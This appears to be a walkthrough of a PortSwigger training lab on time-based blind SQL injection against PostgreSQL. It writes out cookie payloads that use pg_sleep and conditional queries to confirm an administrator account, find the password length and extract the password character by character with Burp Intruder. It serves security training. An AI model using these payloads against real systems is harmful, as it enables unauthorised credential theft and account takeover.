https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

# Lab: Blind SQL injection with time delays and information retrieval

1. `TrackingId=4uRy41ySXO12ar7Q' || (SELECT pg_sleep(5)) ||'` it give us 5s delay.
2. `TrackingId=4uRy41ySXO12ar7Q' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(-1) END) ||'` This query give 5s delay.
3. `TrackingId=4uRy41ySXO12ar7Q' || (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(-1) END) ||'` Not give me any delay.
4. `TrackingId=4uRy41ySXO12ar7Q' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users) ||'` It give 5s delay because in users table a username is `administrator`
5. `TrackingId=4uRy41ySXO12ar7Q' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users) ||'` This give 5s delay so password length is 20
6. By Intruder attack using the query `TrackingId=4uRy41ySXO12ar7Q' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users) ||'` here 1 is 1 to 20 and a is a to z and 0 to 9
7. After the attack we get `20sibzsitioukfihc3tx` (change every time) 
8. Login and solve the lab.